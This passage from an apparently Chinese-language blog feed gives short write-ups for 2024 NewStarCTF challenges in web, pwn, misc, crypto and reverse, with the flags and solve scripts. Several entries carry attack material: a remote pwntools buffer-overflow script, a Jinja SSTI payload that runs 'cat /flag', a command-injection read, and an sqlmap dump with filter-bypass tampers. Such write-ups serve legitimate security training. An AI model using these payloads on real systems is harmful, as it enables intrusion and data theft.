class="headerlink" title="21 Web 会赢吗"></a>21 Web 会赢吗</h3><h4 id="操作内容：-20"><a href="#操作内容：-20" class="headerlink" title="操作内容："></a>操作内容：</h4><p>第一部分F12</p><p><img src="../../../../img/archives/2024-NewStarCTF/0c21dc07e9ddb666cd0d75c47e9feefd.png"></p><p>第二部分提示console直接console执行js</p><p><img src="../../../../img/archives/2024-NewStarCTF/156243640857be146f0eb62a302c3607.png"></p><p>第三部分改csrf_token</p><p><img src="../../../../img/archives/2024-NewStarCTF/48951b69b8edb1aa26afdb711a04e014.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/344e72c7667d780605aa27b1c57d4f4c.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/6538c70abd915e68ecf515321846d6a1.png"></p><p>第四部分发现noscript，和第三步操作一样</p><p><img src="../../../../img/archives/2024-NewStarCTF/01688aaffd36cbc7c620c6f6c5b1ef7e.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/e61ebc5d021d63da371fddafdd7c7245.png"></p><p>CyberChef解密得到flag</p><p><img src="../../../../img/archives/2024-NewStarCTF/70a8776593cc5ec837daa7261bed45b2.png"></p><h4 id="flag值：-20"><a href="#flag值：-20" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}</p><h3 id="22-Web-PangBai-过家家（1）"><a href="#22-Web-PangBai-过家家（1）" class="headerlink" title="22 Web PangBai 过家家（1）"></a>22 Web PangBai 过家家（1）</h3><h4 id="操作内容：-21"><a href="#操作内容：-21" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Start给了一个location，访问进level2</p><p><img src="../../../../img/archives/2024-NewStarCTF/265942e954d00dfd0761719ca3ac4e31.png"></p><p>Level2提示ask&#x3D;miao，get传参进level3</p><p><img src="../../../../img/archives/2024-NewStarCTF/f57f7ec52bd3a88c40ba4df58aba9b6d.png"></p><p>POST传参进level4，改UA引擎为Papa，提示有什么想说的，再提示试着说「玛卡巴卡阿卡哇卡米卡玛卡呣」，然后成功进level5</p><p><img src="../../../../img/archives/2024-NewStarCTF/f3986554850ce7a9da7479be6eea6546.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/58ebb534312399b947288054849da9f5.png"></p><p>Level5，搞了半天file终于成功了</p><p><img src="../../../../img/archives/2024-NewStarCTF/d8170c957e5516d31b9f5912919e2132.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/ac4e2299c91a922faa97b8bf253e2a4a.png"></p><p>Level6 XFF，提示jwt，直接改个level 100，然后404了（</p><p>再改level 7也是404，level0出东西了</p><p><img src="../../../../img/archives/2024-NewStarCTF/91a4c8033e2d2cba27b8259b72f600a2.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/0892a8daeff1b37fad0cf7e2c8cd7c5b.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/56f4501202d5341d6fdc2740b4cc3e95.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/d867d66fe888c576040d6251c68bc013.png"></p><h4 id="flag值：-21"><a href="#flag值：-21" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{d50dbc2b-11ce-44ce-a2b5-aaf6634f89c0}</p><h3 id="23-Pwn-overwrite"><a href="#23-Pwn-overwrite" class="headerlink" title="23 Pwn overwrite"></a>23 Pwn overwrite</h3><h4 id="操作内容：-22"><a href="#操作内容：-22" class="headerlink" title="操作内容："></a>操作内容：</h4><p>将nbytes传入-1（0xFFFFFFFF），可以读取4GB的数据</p><p>nbytes_4栈大小为0x30，填充0x30个字节后，可以覆写bptr的栈</p><p>atoi函数能够处理的最大值为2^31-1（INT_MAX）。如果超出范围，atoi会返回未定义的结果</p><p>通过传入负数绕过长度限制，再输入0x30+0x6个9即可成功读取flag</p><p><img src="../../../../img/archives/2024-NewStarCTF/17fdeeb1f1a563b00407c04240450503.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/f02e8f0df84f7edf77e3d774f6712a98.png"></p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-7"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-7" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>from pwn import *  p &#x3D; remote(“101.200.139.65”, 30899)  p.recvuntil(b’pls input the length you want to readin: ‘) p.sendline(b’-1’)  payload &#x3D; b”9” * 0x30 + b”9” * 0x6 payload +&#x3D; b’\n’ p.recvuntil(b’pls input want you want to say: ‘) p.send(payload) output &#x3D; p.recvall(timeout&#x3D;1) print(output)</th></tr></thead></table><h4 id="flag值：-22"><a href="#flag值：-22" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{fe982009-f8db-4a76-a5c6-f5085c7dd7b8}</p><h3 id="24-Pwn-gdb"><a href="#24-Pwn-gdb" class="headerlink" title="24 Pwn gdb"></a>24 Pwn gdb</h3><h4 id="操作内容：-23"><a href="#操作内容：-23" class="headerlink" title="操作内容："></a>操作内容：</h4><p>简单加密比较判断</p><p><img src="../../../../img/archives/2024-NewStarCTF/7b0998a6722ca66bc96556d29725805d.jpeg"></p><p><img src="../../../../img/archives/2024-NewStarCTF/4bd9b101d8812e6fb18cd8e0b962d873.jpeg"></p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-8"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-8" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>from pwn import *  p&#x3D;remote(“8.147.132.32”,32942) p.recvuntil(b”Input your encrypted data: “) p.send(b”\x5D\x1D\x43\x55\x53\x45\x57\x45\n”) output &#x3D; p.recvall(timeout&#x3D;1) print(output)</th></tr></thead></table><h4 id="flag值：-23"><a href="#flag值：-23" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{ade7cc1b-1f03-49d1-805c-02196f2a5cbb}</p><h3 id="25-Misc-wireshark-checkin"><a href="#25-Misc-wireshark-checkin" class="headerlink" title="25 Misc wireshark_checkin"></a>25 Misc wireshark_checkin</h3><h4 id="操作内容：-24"><a href="#操作内容：-24" class="headerlink" title="操作内容："></a>操作内容：</h4><p>tcp contains “flag”直接出</p><p><img src="../../../../img/archives/2024-NewStarCTF/80b39d9557fc5bdf7d9c4f5acea60c67.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/cbb027a3236d8276cb81825c47a74113.png"></p><h4 id="flag值：-24"><a href="#flag值：-24" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{ez_traffic_analyze_isn’t_it}</p><h3 id="26-Misc-wireshark-secret"><a href="#26-Misc-wireshark-secret" class="headerlink" title="26 Misc wireshark_secret"></a>26 Misc wireshark_secret</h3><h4 id="操作内容：-25"><a href="#操作内容：-25" class="headerlink" title="操作内容："></a>操作内容：</h4><p>http只有一图片，存下来直接是flag</p><p><img src="../../../../img/archives/2024-NewStarCTF/2425d394d800ef762a8da1ba7ae32cd6.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/707b0959b9eda523c91266887064faf5.png"></p><h4 id="flag值：-25"><a href="#flag值：-25" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{you_are_gooddddd}</p><h3 id="27-Misc-热心助人的小明同学"><a href="#27-Misc-热心助人的小明同学" class="headerlink" title="27 Misc 热心助人的小明同学"></a>27 Misc 热心助人的小明同学</h3><h4 id="操作内容：-26"><a href="#操作内容：-26" class="headerlink" title="操作内容："></a>操作内容：</h4><p>PasswareKitForensic一把梭</p><p><img src="../../../../img/archives/2024-NewStarCTF/e67eccb869630a560e58cc416d729dc8.png"></p><h4 id="flag值：-26"><a href="#flag值：-26" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}</p><h3 id="28-Misc-字里行间的秘密"><a href="#28-Misc-字里行间的秘密" class="headerlink" title="28 Misc 字里行间的秘密"></a>28 Misc 字里行间的秘密</h3><h4 id="操作内容：-27"><a href="#操作内容：-27" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Key.txt提示0宽，解密出key</p><p><img src="../../../../img/archives/2024-NewStarCTF/275e041b0efa8ac857529b9644fd6e94.png"></p><p>打开doc，Ctrl+A换颜色得到flag</p><h4 id="flag值：-27"><a href="#flag值：-27" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{you_h4ve_4nyth1n9}</p><h3 id="29-Misc-用溯流仪见证伏特台风"><a href="#29-Misc-用溯流仪见证伏特台风" class="headerlink" title="29 Misc 用溯流仪见证伏特台风"></a>29 Misc 用溯流仪见证伏特台风</h3><h4 id="操作内容：-28"><a href="#操作内容：-28" class="headerlink" title="操作内容："></a>操作内容：</h4><p>直接搜</p><p><img src="../../../../img/archives/2024-NewStarCTF/705ba3022ac1553d40a611d9ddd6474c.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/dd6770bacdf8e77fd7d52f515051a79c.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/c88fccd9d7f3f9610d6da9db392606ff.png"></p><h4 id="flag值：-28"><a href="#flag值：-28" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{6c3ea51b6f9d4f5e}</p><h3 id="30-Misc-Herta’s-Study"><a href="#30-Misc-Herta’s-Study" class="headerlink" title="30 Misc Herta’s Study"></a>30 Misc Herta’s Study</h3><h4 id="操作内容：-29"><a href="#操作内容：-29" class="headerlink" title="操作内容："></a>操作内容：</h4><p>邪恶的题目，真flag在中间</p><p>简单加密</p><p>$ns&#x3D;base64_encode($ns);<br>for($i&#x3D;0;$i&lt;strlen($ns);$i+&#x3D;1){<br> if($i%2&#x3D;&#x3D;1){<br> $ns[$i]&#x3D;str_rot13($ns[$i]);<br> }<br>}<br>return $ns;</p><p><img src="../../../../img/archives/2024-NewStarCTF/ca24dd2011245f601a33e9abd706c1c7.png"></p><p>将假flag&gt;&gt;flag.txt</p><p><img src="../../../../img/archives/2024-NewStarCTF/16996864d317bb920159d7382af01e79.png"></p><p>f.txt是真flag</p><p><img src="../../../../img/archives/2024-NewStarCTF/bdf618bf89510181d3e07fbf2ff4ce82.png"></p><h4 id="解密flag"><a href="#解密flag" class="headerlink" title="解密flag"></a>解密flag</h4><table><thead><tr><th>&lt;?php  function reverseEncryption($ns) { &#x2F;&#x2F; 先解密 ROT13 for ($i &#x3D; 0; $i &lt; strlen($ns); $i++) { if ($i % 2 &#x3D;&#x3D; 1) { $ns[$i] &#x3D; str_rot13($ns[$i]); } }  return base64_decode($ns); }  &#x2F;&#x2F; 使用示例 $encryptedString &#x3D; ‘ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt&#x3D;&#x3D;’;  $decryptedString &#x3D; reverseEncryption($encryptedString); echo $decryptedString;</th></tr></thead></table><h4 id="flag值：-29"><a href="#flag值：-29" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{sH3_i4_S0_6eAut1fuL.}</p><h3 id="31-Misc-你也玩原神吗"><a href="#31-Misc-你也玩原神吗" class="headerlink" title="31 Misc 你也玩原神吗"></a>31 Misc 你也玩原神吗</h3><h4 id="操作内容：-30"><a href="#操作内容：-30" class="headerlink" title="操作内容："></a>操作内容：</h4><p>GIF帧提取，然后提瓦特大陆文字对照，栅栏解密（3），可恶的原神</p><p><img src="../../../../img/archives/2024-NewStarCTF/7e00eec7a9ebd1d4550199a46ae45026.png"></p><h4 id="flag值：-30"><a href="#flag值：-30" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{maybegenshinisagoodgame}</p><h3 id="32-Crypto-这是几次方？-疑惑！"><a href="#32-Crypto-这是几次方？-疑惑！" class="headerlink" title="32 Crypto 这是几次方？ 疑惑！"></a>32 Crypto 这是几次方？ 疑惑！</h3><h4 id="操作内容：-31"><a href="#操作内容：-31" class="headerlink" title="操作内容："></a>操作内容：</h4><p><img src="../../../../img/archives/2024-NewStarCTF/2598dade6e56701b6cda3ef85daaa99c.png"></p><p>factordb分解，pqec直接出，非预期了应该（</p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-9"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-9" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>from Crypto.Util.number import *   c &#x3D; 36513006092776816463005807690891878445084897511693065366878424579653926750135820835708001956534802873403195178517427725389634058598049226914694122804888321427912070308432512908833529417531492965615348806470164107231108504308584954154513331333004804817854315094324454847081460199485733298227480134551273155762 p &#x3D; 9894080171409167477731048775117450997716595135307245061889351408996079284609420327696692120762586015707305237750670080746600707139163744385937564246995541 q &#x3D; 12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531598921 n &#x3D; p*q e &#x3D; 65537 phi &#x3D; (p-1) *(q-1) d &#x3D; inverse(e,phi) m &#x3D; pow(c,d,n) print(long_to_bytes(m))</th></tr></thead></table><h4 id="flag值：-31"><a href="#flag值：-31" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{yihuo_yuan_lai_xian_ji_suan_liang_bian_de2333}</p><h3 id="33-Crypto-Just-one-and-more"><a href="#33-Crypto-Just-one-and-more" class="headerlink" title="33 Crypto Just one_and_more"></a>33 Crypto Just one_and_more</h3><h4 id="操作内容：-32"><a href="#操作内容：-32" class="headerlink" title="操作内容："></a>操作内容：</h4><p>c1 是模 p 的加密，使用 m1 ≡ c1^d1 (mod p) 来解密，c2 是模 N 的加密，使用 m2 ≡ c2^d2 (mod N) 解密</p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-10"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-10" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>from Crypto.Util.number import long_to_bytes, inverse  e &#x3D; 65537 p &#x3D; 11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133 q &#x3D; 11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393 r &#x3D; 12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371 c1 &#x3D; 8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451 c2 &#x3D; 1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445  phi_p &#x3D; p - 1 d1 &#x3D; inverse(e, phi_p) m1 &#x3D; pow(c1, d1, p)  N &#x3D; p * q * r phi_N &#x3D; (p - 1) * (q - 1) * (r - 1) d2 &#x3D; inverse(e, phi_N) m2 &#x3D; pow(c2, d2, N)  flag1 &#x3D; long_to_bytes(m1) flag2 &#x3D; long_to_bytes(m2)  flag &#x3D; flag1 + flag2 print(flag)</th></tr></thead></table><h4 id="flag值：-32"><a href="#flag值：-32" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{Y0u_re4lly_kn0w_Euler_4nd_N3xt_Eu1er_is_Y0u!}</p><h3 id="34-Crypto-Since-you-konw-something"><a href="#34-Crypto-Since-you-konw-something" class="headerlink" title="34 Crypto Since you konw something"></a>34 Crypto Since you konw something</h3><h4 id="操作内容：-33"><a href="#操作内容：-33" class="headerlink" title="操作内容："></a>操作内容：</h4><p>已知flag头为flag，xor开头得到key，解密出flag</p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-11"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-11" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>from pwn import xor from Crypto.Util.number import *  c &#x3D; 218950457292639210021937048771508243745941011391746420225459726647571 cipher_bytes &#x3D; long_to_bytes(c) known_prefix &#x3D; b’flag’ key_length &#x3D; len(known_prefix) key &#x3D; xor(known_prefix, cipher_bytes[:key_length]) print(f”key: {key}”) flag &#x3D; xor(cipher_bytes, key) print(flag)</th></tr></thead></table><h4 id="flag值：-33"><a href="#flag值：-33" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{Y0u_kn0w_th3_X0r_b3tt3r}</p><h3 id="35-Web-你能在一秒内打出八句英文吗"><a href="#35-Web-你能在一秒内打出八句英文吗" class="headerlink" title="35 Web 你能在一秒内打出八句英文吗"></a>35 Web 你能在一秒内打出八句英文吗</h3><h4 id="操作内容：-34"><a href="#操作内容：-34" class="headerlink" title="操作内容："></a>操作内容：</h4><p>考察python requests</p><p><img src="../../../../img/archives/2024-NewStarCTF/81651dba48117790968bf3ad5b92a15f.png"></p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-12"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-12" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>import re import requests  session&#x3D;requests.session() s&#x3D;session.get(“<a href="http://eci-2ze4lt011y5epo26hpzm.cloudeci1.ichunqiu.com/start%22).text">http://eci-2ze4lt011y5epo26hpzm.cloudeci1.ichunqiu.com/start&quot;).text</a> s&#x3D;re.findall(r”&lt;p id&#x3D;\“text\“&gt;([^\&lt;]+)&lt;&#x2F;p&gt;“,s)[0] flag&#x3D;session.post(“<a href="http://eci-2ze4lt011y5epo26hpzm.cloudeci1.ichunqiu.com/submit%22,data=%7B%22user_input">http://eci-2ze4lt011y5epo26hpzm.cloudeci1.ichunqiu.com/submit&quot;,data={&quot;user_input</a>“: s}).text print(flag)</th></tr></thead></table><h4 id="flag值：-34"><a href="#flag值：-34" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{037788c4-1420-460d-866c-7c14131270c8}</p><h3 id="36-Web-遗失的拉链"><a href="#36-Web-遗失的拉链" class="headerlink" title="36 Web 遗失的拉链"></a>36 Web 遗失的拉链</h3><h4 id="操作内容：-35"><a href="#操作内容：-35" class="headerlink" title="操作内容："></a>操作内容：</h4><p>下载源码发现piz<a href="http://www.php/">www.php</a></p><p><img src="../../../../img/archives/2024-NewStarCTF/0b550f56325d0bf193a148378b029eb1.png"></p><p>数组绕过检测，tac &#x2F;f*读flag</p><p><img src="../../../../img/archives/2024-NewStarCTF/edadbefd89f4c5d0342b546b7100a497.png"></p><h4 id="flag值：-35"><a href="#flag值：-35" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{7483bf65-d71b-4868-a6c3-84573de4c65a}</p><h3 id="37-Web-复读机"><a href="#37-Web-复读机" class="headerlink" title="37 Web 复读机"></a>37 Web 复读机</h3><h4 id="操作内容：-36"><a href="#操作内容：-36" class="headerlink" title="操作内容："></a>操作内容：</h4><p>SSTI fenjing一把梭</p><p><code>&#123;&#39;user_input&#39;: &quot;&#123;&#123;((lipsum.__globals__.__builtins__.__import__('os').popen('cat /flag')).read())&#125;&#125;&quot;&#125;</code></p><p><img src="../../../../img/archives/2024-NewStarCTF/9f0db03ff14db0256dfd1032968cbdc3.png"></p><h4 id="flag值：-36"><a href="#flag值：-36" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{xxxxxxxxxxxxxxxxxxxxxxxxxxx}</p><h3 id="37-Misc-BGM坏了吗？"><a href="#37-Misc-BGM坏了吗？" class="headerlink" title="37 Misc BGM坏了吗？"></a>37 Misc BGM坏了吗？</h3><h4 id="操作内容：-37"><a href="#操作内容：-37" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Aud改声道，识别电话拨号音</p><p><img src="../../../../img/archives/2024-NewStarCTF/fc0400e6b1c8be25e7368205c317378c.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/fd37672b51f64614871c3b1fa075fbcb.png"></p><h4 id="flag值：-37"><a href="#flag值：-37" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{2024093020241103}</p><h3 id="38-Misc-OSINT-MASTER"><a href="#38-Misc-OSINT-MASTER" class="headerlink" title="38 Misc OSINT-MASTER"></a>38 Misc OSINT-MASTER</h3><h4 id="操作内容：-38"><a href="#操作内容：-38" class="headerlink" title="操作内容："></a>操作内容：</h4><p>由图可知飞机是A321 B-2419</p><p>图片可知拍摄时间为20240818 14:30</p><p>查询航班历史可知航班号为MU5156，看飞行轨迹找几个中间的地方试一下就出来了济宁市</p><p><img src="../../../../img/archives/2024-NewStarCTF/24c3780248660472ba59ddd955088817.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/91dd0e9763616d85aee0de73863fe49e.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/4d95c4480b31fedfef90dc6f30b15c52.png"></p><h4 id="flag值：-38"><a href="#flag值：-38" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{MU5156_济宁市}</p><h3 id="39-Misc-AmazingGame"><a href="#39-Misc-AmazingGame" class="headerlink" title="39 Misc AmazingGame"></a>39 Misc AmazingGame</h3><h4 id="操作内容：-39"><a href="#操作内容：-39" class="headerlink" title="操作内容："></a>操作内容：</h4><p>MT反编译dex，字符常量直接看到base64和wow，cyberchef解密</p><p><img src="../../../../img/archives/2024-NewStarCTF/ce6165f351707070777c3990056c0341.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/d9e8384ba7834de7c909437e9d297293.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/56e2fd5c6ce937ddfb4c344f4f87bd81.png"></p><h4 id="flag值：-39"><a href="#flag值：-39" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{U_W1n!!_7he_g@m4}</p><h3 id="40-Crypto-故事新编1"><a href="#40-Crypto-故事新编1" class="headerlink" title="40 Crypto 故事新编1"></a>40 Crypto 故事新编1</h3><h4 id="操作内容：-40"><a href="#操作内容：-40" class="headerlink" title="操作内容："></a>操作内容：</h4><p>维吉尼亚，出题人挨打，怎么多换行</p><p>明文扔回去跑一下</p><p><img src="../../../../img/archives/2024-NewStarCTF/9b2c405a565340c513bd00fbbeed646d.png"></p><h4 id="flag值：-40"><a href="#flag值：-40" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{bda2bcf1eaeff7754a6483e74e70a937}</p><h3 id="41-Crypto-故事新编2"><a href="#41-Crypto-故事新编2" class="headerlink" title="41 Crypto 故事新编2"></a>41 Crypto 故事新编2</h3><h4 id="操作内容：-41"><a href="#操作内容：-41" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Autokey Vigenere 明文扔回去跑一下</p><p><img src="../../../../img/archives/2024-NewStarCTF/59cc1c40a584ffef0bcf2b4ddc454efb.png"></p><h4 id="flag值：-41"><a href="#flag值：-41" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{8bc383165248f2e45a6910960a61e6a8}</p><h3 id="43-Web-谢谢皮蛋-plus"><a href="#43-Web-谢谢皮蛋-plus" class="headerlink" title="43 Web 谢谢皮蛋 plus"></a>43 Web 谢谢皮蛋 plus</h3><h4 id="操作内容：-42"><a href="#操作内容：-42" class="headerlink" title="操作内容："></a>操作内容：</h4><p>过滤空格，sqlmap加个绕空格继续嗦</p><p>sqlmap -l sql.txt –tamper space2comment.py,base64encode.py –batch –technique U -D ctf -T Fl4g -C value –dump</p><p><img src="../../../../img/archives/2024-NewStarCTF/1a4855537f31cd06ebe5112dabde4a37.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/d59cb8b079f3724df9bf1817b2261fcb.png"></p><h4 id="flag值：-42"><a href="#flag值：-42" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{13887897-72a5-40e0-814c-b9fcc37c5916}</p><h3 id="44-Web-PangBai-过家家（2）"><a href="#44-Web-PangBai-过家家（2）" class="headerlink" title="44 Web PangBai 过家家（2）"></a>44 Web PangBai 过家家（2）</h3><h4 id="操作内容：-43"><a href="#操作内容：-43" class="headerlink" title="操作内容："></a>操作内容：</h4><p>提示git泄露，flag在环境变量</p><p><img src="../../../../img/archives/2024-NewStarCTF/0e69d1c815ce158dc2dad279fbe0e1c9.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/c241452b2a469b5d6adfee20af08df61.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/94c780108ef3700142fdb3c7bba14d1e.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/8f1bf087d2ba497338892a88f0a228f4.png"></p><h4 id="flag值：-43"><a href="#flag值：-43" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{e3896b60-9711-4651-bc0a-bcf719fc7924}</p><h3 id="45-Crypto-茶里茶气"><a href="#45-Crypto-茶里茶气" class="headerlink" title="45 Crypto 茶里茶气"></a>45 Crypto 茶里茶气</h3><h4 id="操作内容：-44"><a href="#操作内容：-44" class="headerlink" title="操作内容："></a>操作内容：</h4><p>加料的tea加密，逆向解一下</p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-13"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-13" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>from Crypto.Util.number import long_to_bytes  l &#x3D; 199 p &#x3D; 446302455051275584229157195942211 v0 &#x3D; 190997821330413928409069858571234 v1 &#x3D; 137340509740671759939138452113480  derta &#x3D; 462861781278454071588539315363 v3 &#x3D; 489552116384728571199414424951 v4 &#x3D; 469728069391226765421086670817 v5 &#x3D; 564098252372959621721124077407 v6 &#x3D; 335640247620454039831329381071  v2 &#x3D; (32 * derta) % p for i in range(32):  v2 -&#x3D; derta  v2 %&#x3D; p  v0 -&#x3D; (v1 + v2) ^ (8 * v1 + v5) ^ ((v1 &gt;&gt; 7) + v6)  v0 %&#x3D; p  v1 -&#x3D; (v0 + v2) ^ (8 * v0 + v3) ^ ((v0 &gt;&gt; 7) + v4)  v1 %&#x3D; p  a_int &#x3D; (v0 &lt;&lt; (l &#x2F;&#x2F; 2)) + v1 a_hex &#x3D; hex(a_int)[2:]  print(long_to_bytes(int(a_hex, 16)))</th></tr></thead></table><h4 id="flag值：-44"><a href="#flag值：-44" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{f14gg9_te2_1i_7ea_7}</p><h3 id="46-Reverse-UPX"><a href="#46-Reverse-UPX" class="headerlink" title="46 Reverse UPX"></a>46 Reverse UPX</h3><h4 id="操作内容：-45"><a href="#操作内容：-45" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Upx脱壳，IDA打开发现是RC4解密，key为NewStar</p><p><img src="../../../../img/archives/2024-NewStarCTF/68eae2d265fbe6156d9315745a603cdc.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/0ca16ad4cca6de83b60fc35b3183b067.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/1fa1b424519752fbd5a46573224cec2d.png"></p><h4 id="flag值：-45"><a href="#flag值：-45" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{Do_you_know_UPX?}</p><h3 id="47-Reverse-Dirty-flowers"><a href="#47-Reverse-Dirty-flowers" class="headerlink" title="47 Reverse Dirty_flowers"></a>47 Reverse Dirty_flowers</h3><h4 id="操作内容：-46"><a href="#操作内容：-46" class="headerlink" title="操作内容："></a>操作内容：</h4><p>Create function，随便点点就出密文和key了</p><p><img src="../../../../img/archives/2024-NewStarCTF/8de5cbe74451b3a4153ced5ffef00233.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/a81ab67d827d28ee8133324d6520a5df.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/1c157207727668184318d19f5a9cf3e8.png"></p><h4 id="如该题使用自己编写的脚本代码请详细写出，不允许截图-14"><a href="#如该题使用自己编写的脚本代码请详细写出，不允许截图-14" class="headerlink" title="如该题使用自己编写的脚本代码请详细写出，不允许截图"></a>如该题使用自己编写的脚本代码请详细写出，不允许截图</h4><table><thead><tr><th>enc &#x3D; [2, 5, 19, 19, 2, 30, 83, 31, 92, 26, 39, 67, 29, 54, 67, 7, 38, 45, 85, 13, 3, 27, 28, 45, 2, 28, 28, 48, 56, 50, 85, 2, 27, 22, 84, 15] key &#x3D; “dirty_flower”  def decrypt(enc, key):  return ‘’.join(chr(enc[i] ^ ord(key[i % len(key)])) for i in range(len(enc)))  flag &#x3D; decrypt(enc, key) print(flag)</th></tr></thead></table><h4 id="flag值：-46"><a href="#flag值：-46" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{A5s3mB1y_1s_r3ally_funDAm3nta1}</p><h3 id="48-Reverse-drink-tea"><a href="#48-Reverse-drink-tea" class="headerlink" title="48 Reverse drink_tea"></a>48 Reverse drink_tea</h3><h4 id="操作内容：-47"><a href="#操作内容：-47" class="headerlink" title="操作内容："></a>操作内容：</h4><p>题目提示tea，直接找到密文和key解明文</p><p><img src="../../../../img/archives/2024-NewStarCTF/4267757082fcc89f0be79b448a75aec6.png"></p><p><img src="../../../../img/archives/2024-NewStarCTF/a664f79b6de9f26a9c3a9771a775d6aa.png"></p><h4 id="flag值：-47"><a href="#flag值：-47" class="headerlink" title="flag值："></a>flag值：</h4><p>flag{There_R_TEA_XTEA_and_XXTEA}</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Misc</tag>
      
      <tag>Web</tag>
      
      <tag>Crypto</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 YLCTF</title>
    <link href="/2024/11/01/2024-YLCTF/"/>
